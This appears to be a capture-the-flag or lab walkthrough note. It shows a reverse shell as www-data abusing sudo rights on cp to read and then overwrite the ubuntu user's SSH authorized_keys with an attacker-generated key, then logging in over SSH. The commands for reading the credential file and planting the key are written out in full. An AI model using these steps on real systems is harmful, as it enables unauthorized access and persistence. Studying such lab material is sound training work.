## Getting SSH Keys

After getting a Reverse Shell you need to get SSH Keys to connect via SSH.

As you can use /bin/cp command as root from run the following command:

www-data@ip-10-200-113-12:/var/www/html$ `sudo /bin/cp /home/ubuntu/.ssh/authorized_keys /dev/stdout`

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeZbsrpsTaTF6VqP3nAl9icN4AGzsrhyxHHJq3nikhy7MV0effPfpWGgIuY2/8n3Ec7pcS8O3eWZLZInQQsyyby6ET072BkPu9Ku7alVTVwfNJytP49a/AajZ4PpvdT4smJkhxXgF7Y0Z9fd6DgYvkeE7e/xTdYysU4lmzGUbt5xPAKWlVh3kzt/8Ay+JaTnevxPiwEvWN2tushosde2XcyMfQAFYpFoOF5gL7QgkqoV4gm73SH93vvq0mNuqlGyGzXiWP5auwJK4qSnS1MXtx2WbTyE61zTnsxA9OQSHTtMNMiAQOAMTF/DQ38wPEy4SNaIecJCFPkqM50cTw++w7 TGreen-Key

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+IKDiXx+vyfU2QWArKGbJeT1Q/WvF7jX1slAmt/iZu89fUABt2O0wtqxs5e38zO4RvM8xqYwk3Pn0Sikqcaqlk2ra2A7xFdG92RNs4QYXJUyK6dW+G5RZGBQe+f0nIFx9Dz19WqlfbGWpenke5PYGLpNvZRilA9EvIvIJG6+lKf9CRgI0T5vkarqpuVSIqyS3wggOmj/vtzGM0bjERJJdsHaRtje4FJaRK3obIsOpfvSchq9QAmP72EYA4X4+eifThmlIF/o3b8uFwOTlhznjKtcEL5Dfrqc8X2Yv2p9R5kjI6/fpZbuXWVRWUHAu+Snu0RPqacJXGuAxUpb0COKf ubuntu@ip-172-31-10-250

## Create a new key on Kali

$ `ssh-keygen -t rsa`

Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in rsa
Your public key has been saved in rsa.pub
The key fingerprint is:
SHA256:ODVcPKMY0xdD9uWpM9Veol6AHNY6YFg0+HAs1+yZ2t4 kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|       B+=Oo  .  |
|      B.B*B=.o o |
|       @+=o*o = o|
|      .oo.*  = o.|
|      o So .= . .|
|       .. .. +   |
|         . ..    |
|          . E    |
|                 |
+----[SHA256]-----+


$ `cat rsa.pub`


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC20C4/W73M8kWWcghrF7puisfbN2/f8bwQ/FfKyKnCD6CphOfzNLPF+UX2xVBxTRD5zPBHFQ7reLojGLbSSxkBbWve7Jg3hcUiVefB08SRs11aHD8GR894j6WPzI0nuXsoVoeEfGYF70zbrsemmNHA6eFaAwJNsramm/BwIfcitLgKtey9ptd9Tu+eYAetN4Ii8VGWAvQ2EkbdZ9HQrZkCOPIA2pV8aIXRtGZWKPz7Nn3vi3bEjs0RgLUqRPtJ4ByVXXI/mc8SMQnRbc3ZPioHlLK7OmAc/OzNMyTN6Xf0/Wl2Gz7RrlrmszM5BYRo3rHutgLZUkYivoZ3Td1ug1Pmw2JyPL1TMFC6DVNTPK7+x45Yq0iW0n2/UXpKRmeWo83drhahhTfazid3PuLciwS+YZnxoE0g2cp4XxE+dzjcwias7oXoNSIPZ4Tim6q35fg4b5ItA5ZS/VlBjK0oCa3S9JQ7XqRFayz2rBIF1+1y+qR/ji+Mvi6v6Ln5vqUr+Q8= kali@kali



## cp command
From https://gtfobins.github.io/gtfobins/cp/

![[SSH (10.200.X.12)-20240529152448150.webp]]


## Drop this key into the VPN's authorized_keys file
Following the instructions from  File Write section run the commands on the reverse shell to drop the key into the VPN's authorized_keys file.


`LFILE=/home/ubuntu/.ssh/authorized_keys`

`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC20C4/W73M8kWWcghrF7puisfbN2/f8bwQ/FfKyKnCD6CphOfzNLPF+UX2xVBxTRD5zPBHFQ7reLojGLbSSxkBbWve7Jg3hcUiVefB08SRs11aHD8GR894j6WPzI0nuXsoVoeEfGYF70zbrsemmNHA6eFaAwJNsramm/BwIfcitLgKtey9ptd9Tu+eYAetN4Ii8VGWAvQ2EkbdZ9HQrZkCOPIA2pV8aIXRtGZWKPz7Nn3vi3bEjs0RgLUqRPtJ4ByVXXI/mc8SMQnRbc3ZPioHlLK7OmAc/OzNMyTN6Xf0/Wl2Gz7RrlrmszM5BYRo3rHutgLZUkYivoZ3Td1ug1Pmw2JyPL1TMFC6DVNTPK7+x45Yq0iW0n2/UXpKRmeWo83drhahhTfazid3PuLciwS+YZnxoE0g2cp4XxE+dzjcwias7oXoNSIPZ4Tim6q35fg4b5ItA5ZS/VlBjK0oCa3S9JQ7XqRFayz2rBIF1+1y+qR/ji+Mvi6v6Ln5vqUr+Q8= kali@kali" | sudo cp /dev/stdin "$LFILE"`

## Connect to the server from Kali

$  `ssh ubuntu@10.200.10.12 -i rsa`

![[Connect via SSH (10.200.X.12)-20240704145204304.webp]]

**Next step:** [[Privilege Escalation]]



